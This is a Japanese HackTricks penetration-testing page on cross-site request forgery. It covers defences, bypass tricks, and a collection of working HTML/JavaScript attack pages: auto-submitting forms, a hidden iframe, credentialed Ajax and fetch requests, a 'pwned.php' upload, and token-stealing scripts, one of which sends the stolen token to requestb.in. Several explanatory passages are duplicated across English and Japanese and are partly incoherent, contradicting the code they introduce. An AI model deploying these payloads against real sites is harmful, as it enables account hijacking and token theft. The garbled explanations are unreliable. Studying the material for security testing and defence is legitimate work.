# CSRF（クロスサイトリクエストフォージェリ）

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

## CSRFとは？

**クロスサイトリクエストフォージェリ**（CSRF）は、ウェブセキュリティの脆弱性であり、攻撃者がユーザーに**意図しないアクションを実行させる**ことができます。\
これは、**ログインしているユーザー**が攻撃者が制御するウェブサイトにアクセスし、そこから悪意のあるJSコードを実行したり、フォームを送信したり、"画像"を**被害者のアカウント**に取得することで行われます。

### 必要条件

CSRFの脆弱性を悪用するためには、まず**悪用する重要なアクションを見つける必要があります**（パスワードやメールアドレスの変更、被害者をソーシャルネットワークでフォローさせる、より多くの特権を与えるなど）。セッションは**クッキーまたはHTTPベーシック認証ヘッダーにのみ依存**している必要があり、他のヘッダーはセッションの処理に使用できません。そして、リクエストに**予測不可能なパラメーターがない**必要があります。

この脆弱性を回避するためには、いくつかの**対策**が取られる場合があります。

### **一般的な防御策**

* [**SameSiteクッキー**](hacking-with-cookies/#samesite): セッションクッキーがこのフラグを使用している場合、任意のウェブサイトからクッキーを送信できない場合があります。
* [**クロスオリジンリソース共有**](cors-bypass.md): 関連するアクションを悪用するために実行する必要があるHTTPリクエストの種類に応じて、被害者サイトの**CORSポリシー**を考慮する必要があります。_CORSポリシーは、単にGETリクエストまたはフォームからのPOSTリクエストを送信し、応答を読み取る必要がない場合には影響しません。_
* **パスワード**ユーザーにアクションを許可するように要求する。
* **キャプチャ**を解決する
* **リファラ**または**オリジン**ヘッダーを読む。正規表現が使用されている場合、次のようにバイパスできます。
* http://mal.net?orig=http://example.com（URLで終わる）
* http://example.com.mal.net（URLで始まる）
* POSTまたはGETリクエストのパラメーターの**名前**を**変更**する
* 各セッションで**CSRFトークン**を使用する。このトークンは、アクションを確認するためにリクエスト内に送信する必要があります。このトークンはCORSで保護される場合があります。

### CSRFマップ

![](<../.gitbook/assets/image (112).png>)

## 防御バイパス

### POSTからGETへ

悪用したいフォームが**CSRFトークンを使用してPOSTリクエストを送信する準備ができているかどうか**を確認する必要がありますが、**GET**も**有効**であり、GETリクエストを送信するときに**CSRFトークンが引き続き検証されているかどうか**を確認する必要があります。

### トークンの欠如

一部のアプリケーションは、トークンが存在する場合に正しく**トークンを検証**しますが、トークンが欠落している場合には検証をスキップします。\
この状況では、攻撃者はトークンを含むパラメーター全体を（値だけでなく）削除して検証をバイパスし、CSRF攻撃を実行できます。

### CSRFトークンがユーザーセッションに関連付けられていない

一部のアプリケーションは、リクエストを行っているユーザーと同じセッションにトークンが属していることを**検証しない**場合があります。代わりに、アプリケーションは発行したトークンのグローバルプールを維持し、このプールに表示されるトークンを受け入れます。\
この状況では、攻撃者は自分のアカウントを使用してアプリケーションにログインし、有効なトークンを取得し、そのトークンをCSRF攻撃の被害者ユーザーに提供することができます。

### メソッドバイパス

リクエストが「**奇妙な**」**メソッド**を使用している場合、**メソッドオーバーライド機能**が機能しているかどうかを確認してください。\
たとえば、**PUT**メソッドを使用している場合、**POST**メソッドを使用して次のように送信できます：_https://example.com/my/dear/api/val/num?**\_method=PUT**_

これは、**\_methodパラメーターをPOSTリクエスト内に送信**するか、**ヘッダー**を使用しても機能します。

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### カスタムヘッダートークンのバイパス

もしリクエストが**CSRF保護手法**として**トークン**を含む**カスタムヘッダー**を追加している場合、以下の手順を実行します：

* **カスタムトークンとヘッダーを含まない**状態でリクエストをテストします。
* **同じ長さ**ですが**異なるトークン**を使用してリクエストをテストします。

### CSRFトークンはクッキーで検証されます

前述の脆弱性のさらなるバリエーションとして、一部のアプリケーションは**クッキーとリクエストパラメーターの両方に同じトークンを複製**します。または、**CSRFクッキーを設定**し、バックエンドで**クッキーに関連付けられたCSRFトークンが送信されたトークンと一致するかどうかをチェック**します。

次のリクエストが検証される際、アプリケーションは単純に**リクエストパラメーターに送信されたトークンがクッキーに保存された値と一致するかどうか**を確認します。\
この状況では、攻撃者は再びCSRF攻撃を実行することができます。攻撃者は、犠牲者にCSRFクッキーを設定することができる脆弱性がウェブサイトに存在する場合、CRLFのような形で攻撃を行うことができます。

この場合、偽の画像を読み込むことを試みてクッキーを設定し、次にこの例のようにCSRF攻撃を実行することができます：
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
注意してください。**csrfトークンがセッションクッキーに関連付けられている場合、この攻撃は機能しません**。なぜなら、被害者に自分のセッションを設定する必要があり、したがって自分自身を攻撃することになるからです。
{% endhint %}

### Content-Typeの変更

[**こちら**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)によると、**プリフライトを回避**するために、**POST**メソッドを使用する場合、次のContent-Typeの値が許可されています。

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

ただし、使用する**Content-Type**によっては、**サーバーのロジックが異なる場合がある**ことに注意してください。したがって、上記の値や**`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._など、他の値も試してみる必要があります。

[ここ](https://brycec.me/posts/corctf\_2021\_challenges)からの例：JSONデータをtext/plainとして送信する場合：
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### application/json preflight request bypass

既にお知りの通り、HTMLフォームを介してContent-Typeが**`application/json`**のPOSTリクエストを送信することはできません。また、**`XMLHttpRequest`**を使用して送信しようとすると、最初に**preflight**リクエストが送信されます。\
ただし、バックエンドがContent-Typeに関係なくデータを使用しているかどうかを確認するために、JSONデータをcontent types **`text/plain`** および **`application/x-www-form-urlencoded`** を使用して送信することができます。\
`Content-Type: text/plain`を使用してフォームを送信することができます。**`enctype="text/plain"`**を設定します。

サーバーがコンテンツタイプ "application/json" のみを受け入れる場合、preflightリクエストをトリガーせずに**コンテンツタイプ "text/plain; application/json"**を送信することができます。

また、**SWFフラッシュファイル**を使用してこの制限を**バイパス**することもできます。詳細については、[**この投稿**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)を読んでください。

### Referrer / Origin check bypass

**Refererヘッダーを回避する**

一部のアプリケーションでは、リクエストにRefererヘッダーが存在する場合にのみ、そのヘッダーを検証しますが、ヘッダーが省略された場合は検証をスキップします。
```markup
<meta name="referrer" content="never">
```
**正規表現のバイパス**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Referrerがパラメータ内で送信するURLのサーバーのドメイン名を設定するには、次のようにします：
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについて詳しく学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグ報酬について通知を受ける

💬 コミュニティディスカッションに参加する

## **攻撃例**

### **CSRFトークンの抽出**

もし**CSRFトークン**が**防御手段**として使用されている場合、[**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens)の脆弱性や[**Dangling Markup**](dangling-markup-html-scriptless-injection.md)の脆弱性を悪用して**抽出**することができます。

### **HTMLタグを使用したGET**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
他のHTML5タグを使用して自動的にGETリクエストを送信することもできます。

![](<../.gitbook/assets/image (530).png>)

### フォームのGETリクエスト
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### フォームのPOSTリクエスト

To perform a Cross-Site Request Forgery (CSRF) attack, an attacker can create a malicious HTML page that includes a form with a POST method. This form is designed to submit data to a target website without the user's knowledge or consent.

To execute the attack, the attacker tricks the victim into visiting the malicious page. When the victim loads the page, the form is automatically submitted, sending the data to the target website. Since the victim is already authenticated on the target website, the server processes the request as if it came from the victim.

The attacker can use this technique to perform various malicious actions, such as changing the victim's account settings, making unauthorized purchases, or even deleting data.

To protect against CSRF attacks, web developers can implement measures such as using anti-CSRF tokens, checking the Referer header, or implementing SameSite cookies.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframeを通じたフォームのPOSTリクエスト

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a victim into submitting a malicious form through an iframe. This technique is commonly used when the target website has implemented CSRF protection mechanisms that prevent direct form submissions from external domains.

攻撃者は、iframeを介して被害者に悪意のあるフォームを送信させることで、クロスサイトリクエストフォージェリ（CSRF）の脆弱性を悪用することができます。この技術は、対象のウェブサイトが外部ドメインからの直接のフォーム送信を防ぐCSRF保護メカニズムを実装している場合によく使用されます。

To perform this attack, the attacker crafts a webpage that contains an iframe pointing to the target website's vulnerable form. The attacker then tricks the victim into visiting this webpage, which loads the iframe and automatically submits the form without the victim's knowledge.

この攻撃を実行するために、攻撃者は対象のウェブサイトの脆弱なフォームを指すiframeを含むウェブページを作成します。攻撃者はその後、被害者にこのウェブページを訪れさせ、iframeを読み込み、被害者の知識を持たずにフォームを自動的に送信させます。

The malicious form can be designed to perform various actions on behalf of the victim, such as changing account settings, making purchases, or even initiating sensitive transactions. Since the request originates from the victim's browser, it appears legitimate to the target website, bypassing any CSRF protection measures in place.

悪意のあるフォームは、被害者の代わりにさまざまなアクションを実行するように設計することができます。例えば、アカウント設定の変更、購入の実行、または機密なトランザクションの開始などです。リクエストは被害者のブラウザから発信されるため、対象のウェブサイトには正当なものと見なされ、CSRF保護対策を回避します。

To mitigate this vulnerability, web developers should implement CSRF protection mechanisms such as anti-CSRF tokens or same-site cookies. Additionally, users should be cautious when visiting unfamiliar websites or clicking on suspicious links to minimize the risk of falling victim to CSRF attacks.

この脆弱性を軽減するために、ウェブ開発者は、アンチ-CSRFトークンや同一サイトクッキーなどのCSRF保護メカニズムを実装する必要があります。さらに、ユーザーは、不慣れなウェブサイトを訪れたり、疑わしいリンクをクリックしたりする際に注意を払い、CSRF攻撃に巻き込まれるリスクを最小限に抑えるべきです。
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST リクエスト**

Ajax POST リクエストは、Webアプリケーションの脆弱性を悪用するための一般的な攻撃手法の1つです。この攻撃は、クロスサイトリクエストフォージェリ（CSRF）としても知られています。

攻撃者は、被害者がログインしているWebアプリケーションに対して、不正なPOSTリクエストを送信します。このリクエストは、被害者の認証情報を使用して送信されるため、Webアプリケーションは正当なリクエストとして処理します。

攻撃者は、不正なリクエストを作成するためにJavaScriptを使用し、そのリクエストを送信するためにAjaxを利用します。これにより、攻撃者は被害者のアカウントに対して悪意のある操作を実行することができます。

この攻撃を防ぐためには、WebアプリケーションはCSRFトークンを実装する必要があります。CSRFトークンは、リクエストが正当なものであることを確認するために使用されます。トークンは、ユーザーのセッションに関連付けられ、リクエストと一緒に送信されます。Webアプリケーションは、トークンが正当であるかどうかを検証し、不正なリクエストを拒否することができます。

攻撃者は、CSRFトークンを知らない限り、この攻撃を成功させることはできません。したがって、Webアプリケーションのセキュリティを向上させるためには、CSRFトークンの実装が重要です。
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST リクエスト

When submitting a form with file uploads, the `multipart/form-data` encoding type is used. This encoding allows the form data to be sent as a series of parts, each containing a separate field and its corresponding value.

To perform a CSRF attack on a `multipart/form-data` POST request, the attacker needs to craft a malicious HTML page that includes a form with the target website's URL as the action attribute. The attacker can then trick the victim into submitting this form, causing the victim's browser to send the request to the target website.

The attacker can include hidden fields in the form to specify the values of the fields expected by the target website. These hidden fields can be pre-filled with values that the attacker wants to submit.

To prevent CSRF attacks, it is important for websites to implement measures such as using anti-CSRF tokens. These tokens are unique for each user session and are included in the form as a hidden field. When the form is submitted, the server verifies the token to ensure that the request is legitimate.

By understanding how `multipart/form-data` POST requests work and the potential vulnerabilities they can introduce, you can better protect your website from CSRF attacks.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST リクエスト v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request.

#### Overview

A multipart/form-data POST request is commonly used to upload files or submit form data that includes binary content. This type of request consists of multiple parts, each containing a separate piece of data.

#### Exploiting CSRF with multipart/form-data POST request

To exploit CSRF using a multipart/form-data POST request, follow these steps:

1. Identify the target website that is vulnerable to CSRF.
2. Craft a malicious HTML page or an email containing a hidden form that submits a multipart/form-data POST request to the target website.
3. Include the necessary fields in the form to perform the desired action on the target website.
4. Set the `enctype` attribute of the form to `multipart/form-data` to indicate that the request will contain multiple parts.
5. Set the `method` attribute of the form to `POST` to specify that the request should be sent using the POST method.
6. Set the `action` attribute of the form to the URL of the target website's vulnerable endpoint.
7. Include any additional fields required by the target website, such as CSRF tokens or session cookies.
8. Submit the form automatically using JavaScript or by tricking the victim into submitting it.
9. The target website will process the malicious request, unaware that it was initiated by an attacker.
10. The desired action will be performed on the target website, potentially leading to unauthorized access or data manipulation.

#### Mitigation

To protect against CSRF attacks using multipart/form-data POST requests, consider implementing the following measures:

- Implement CSRF tokens: Include a unique token in each form submission and verify its authenticity on the server-side.
- Implement SameSite cookies: Set the SameSite attribute of cookies to `Strict` or `Lax` to prevent cross-site requests.
- Implement CSRF protection frameworks: Utilize frameworks that provide built-in protection against CSRF attacks, such as Django's CSRF middleware.

By understanding and mitigating CSRF vulnerabilities, you can enhance the security of your web applications and protect user data from unauthorized access or manipulation.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### iframe 内からのフォーム POST リクエスト

When an HTML form is submitted, the browser sends a POST request to the specified URL. This behavior can be exploited in a Cross-Site Request Forgery (CSRF) attack when the form is submitted from within an iframe.

HTML フォームが送信されると、ブラウザは指定された URL に POST リクエストを送信します。この動作は、フォームが iframe 内から送信された場合に、クロスサイトリクエストフォージェリ（CSRF）攻撃で悪用される可能性があります。

To perform a CSRF attack using an iframe, an attacker can create a webpage with an iframe that loads the target website's form. The attacker can then use JavaScript to automatically submit the form without the user's knowledge.

iframe を使用して CSRF 攻撃を実行するには、攻撃者はターゲットのウェブサイトのフォームを読み込む iframe を含むウェブページを作成します。攻撃者は JavaScript を使用して、ユーザーの知識を持たずにフォームを自動的に送信することができます。

This attack works because the browser includes the user's session cookies in the POST request, allowing the attacker to impersonate the user and perform actions on their behalf.

この攻撃は、ブラウザが POST リクエストにユーザーのセッションクッキーを含めるため、攻撃者がユーザーをなりすまし、その代わりに操作を実行することができるために機能します。

To protect against CSRF attacks, web developers should implement measures such as using anti-CSRF tokens, validating the referrer header, and implementing strict access controls.

CSRF 攻撃に対抗するために、ウェブ開発者は、アンチ-CSRF トークンの使用、リファラーヘッダーの検証、厳格なアクセス制御の実装などの対策を実施する必要があります。
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRFトークンを盗み、POSTリクエストを送信する**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request on behalf of the victim.

CSRFトークンを盗むためには、ターゲットのウェブサイトからCSRFトークンを取得し、それを利用して被害者の代わりに悪意のあるPOSTリクエストを送信する必要があります。

Here are the steps to accomplish this:

以下は、これを実行するための手順です。

1. **Steal the CSRF token**: The CSRF token is typically embedded in the HTML form or included as a cookie. You can use various techniques like cross-site scripting (XSS) or social engineering to trick the victim into executing a script that retrieves the token and sends it to your controlled server.

1. **CSRFトークンを盗む**: CSRFトークンは通常、HTMLフォームに埋め込まれるか、クッキーとして含まれます。クロスサイトスクリプティング（XSS）やソーシャルエンジニアリングなどのさまざまな技術を使用して、被害者を騙してトークンを取得し、それをあなたの制御下のサーバーに送信するスクリプトを実行させることができます。

2. **Craft the malicious POST request**: Once you have the CSRF token, you can craft a malicious POST request with the desired payload. This payload can include actions like changing the victim's password, making unauthorized transactions, or modifying sensitive data.

2. **悪意のあるPOSTリクエストを作成する**: CSRFトークンを取得したら、望むペイロードを含んだ悪意のあるPOSTリクエストを作成することができます。このペイロードには、被害者のパスワードの変更、不正なトランザクションの実行、または機密データの変更などのアクションが含まれることがあります。

3. **Send the POST request**: Finally, you send the crafted POST request to the target website. Since the request includes the stolen CSRF token, the server will consider it as a legitimate request and perform the desired action on behalf of the victim.

3. **POSTリクエストを送信する**: 最後に、作成したPOSTリクエストをターゲットのウェブサイトに送信します。リクエストには盗まれたCSRFトークンが含まれているため、サーバーはそれを正当なリクエストと見なし、被害者の代わりに望ましいアクションを実行します。

It is important to note that CSRF attacks can be mitigated by implementing countermeasures such as using CSRF tokens, checking the Referer header, and implementing CAPTCHAs. As a pentester, it is crucial to identify and exploit CSRF vulnerabilities to help organizations strengthen their security defenses.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRFトークンを盗み、iframe、フォーム、およびAjaxを使用してPOSTリクエストを送信する**

CSRF（Cross-Site Request Forgery）攻撃は、攻撃者が被害者の代わりに意図しないリクエストを送信する攻撃手法です。この攻撃を行うためには、被害者のセッションに関連付けられたCSRFトークンを盗む必要があります。

以下の手順で、CSRFトークンを盗み、それを使用してPOSTリクエストを送信する方法を説明します。

1. 攻撃者は、悪意のあるウェブサイトにiframeを埋め込みます。このiframeは、被害者のウェブサイトにアクセスします。

```html
<iframe src="https://victim-website.com"></iframe>
```

2. iframe内のスクリプトを使用して、被害者のウェブサイトからCSRFトークンを取得します。

```javascript
var csrfToken = document.querySelector('input[name="csrf_token"]').value;
```

3. 攻撃者は、取得したCSRFトークンを使用して、悪意のあるリクエストを送信するためのフォームを作成します。

```html
<form id="malicious-form" action="https://victim-website.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacker-password">
  <input type="hidden" name="csrf_token" value="">
</form>
```

4. フォームのCSRFトークンフィールドに、取得したCSRFトークンを設定します。

```javascript
document.querySelector('#malicious-form input[name="csrf_token"]').value = csrfToken;
```

5. 攻撃者は、フォームを自動的に送信するために、JavaScriptを使用します。

```javascript
document.getElementById('malicious-form').submit();
```

6. または、Ajaxを使用して悪意のあるリクエストを送信することもできます。

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://victim-website.com/change-password', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('new_password=hacker-password&csrf_token=' + csrfToken);
```

以上の手順により、攻撃者は被害者のセッションを乗っ取り、悪意のあるリクエストを送信することができます。被害者は、攻撃が発生したことに気付かずに、意図しないアクションを実行してしまう可能性があります。
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRFトークンを盗み、iframeとフォームを使用してPOSTリクエストを送信する**

CSRF（Cross-Site Request Forgery）攻撃は、攻撃者が被害者の代わりに意図しないリクエストを送信する攻撃手法です。この攻撃を行うためには、被害者のセッションに関連付けられたCSRFトークンを盗む必要があります。

以下の手順でCSRFトークンを盗み、iframeとフォームを使用してPOSTリクエストを送信することができます。

1. 攻撃者は、悪意のあるウェブサイトを作成します。このウェブサイトには、攻撃者が制御するサーバーにPOSTリクエストを送信するためのフォームが含まれています。

2. 攻撃者は、被害者を誘導して悪意のあるウェブサイトを訪れさせます。被害者がこのウェブサイトを訪れると、攻撃者のサーバーに対してPOSTリクエストが送信されます。

3. 攻撃者のサーバーは、被害者のセッションに関連付けられたCSRFトークンを盗みます。これにより、攻撃者は被害者のセッションをなりすまし、意図しないリクエストを送信することができます。

4. 攻撃者のサーバーは、盗んだCSRFトークンを使用して、被害者のセッションに対して意図しないPOSTリクエストを送信します。このリクエストは、攻撃者が制御するサーバーに対して送信されます。

以上の手法を使用することで、攻撃者は被害者のセッションを乗っ取り、意図しないアクションを実行することができます。被害者は、悪意のあるウェブサイトにアクセスしないように注意する必要があります。また、ウェブアプリケーション開発者は、CSRFトークンの適切な実装やセキュリティ対策を行うことが重要です。
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **トークンを盗み、2つのiframeを使用して送信する**

In this technique, we will exploit a Cross-Site Request Forgery (CSRF) vulnerability to steal a user's token and send it to an attacker-controlled server using two iframes.

この技術では、Cross-Site Request Forgery（CSRF）の脆弱性を悪用して、ユーザーのトークンを盗み、2つのiframeを使用して攻撃者が制御するサーバーに送信します。

First, we need to identify a vulnerable website that is susceptible to CSRF attacks. Once we have found a target, we can proceed with the following steps:

まず、CSRF攻撃の影響を受けやすい脆弱なウェブサイトを特定する必要があります。ターゲットを見つけたら、以下の手順を実行します。

1. Create a malicious webpage that contains two iframes. The first iframe will load the target website, and the second iframe will load an attacker-controlled webpage.

   1. 2つのiframeを含む悪意のあるウェブページを作成します。最初のiframeはターゲットのウェブサイトを読み込み、2番目のiframeは攻撃者が制御するウェブページを読み込みます。

2. In the first iframe, we will inject JavaScript code to extract the user's token from the target website. This can be done by accessing the DOM elements that contain the token and extracting its value.

   2. 最初のiframeには、JavaScriptコードを挿入して、ターゲットのウェブサイトからユーザーのトークンを抽出します。これは、トークンを含むDOM要素にアクセスし、その値を抽出することで実現できます。

3. Once we have obtained the token, we will use JavaScript to send it to the attacker-controlled server. This can be done by making a POST request to the server with the token as a parameter.

   3. トークンを取得したら、JavaScriptを使用してそれを攻撃者が制御するサーバーに送信します。これは、トークンをパラメータとしてサーバーにPOSTリクエストを行うことで実現できます。

4. The second iframe will be used to hide the malicious activity from the user. It can be set to a small size or positioned off-screen so that the user is unaware of its presence.

   4. 2番目のiframeは、ユーザーに悪意のある活動を隠すために使用されます。小さなサイズに設定するか、画面外に配置することで、ユーザーはその存在に気付かないようにすることができます。

By loading the malicious webpage containing the iframes, the user's token will be stolen and sent to the attacker-controlled server without their knowledge.

iframeを含む悪意のあるウェブページを読み込むことで、ユーザーのトークンが盗まれ、彼らの知識を持たずに攻撃者が制御するサーバーに送信されます。
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
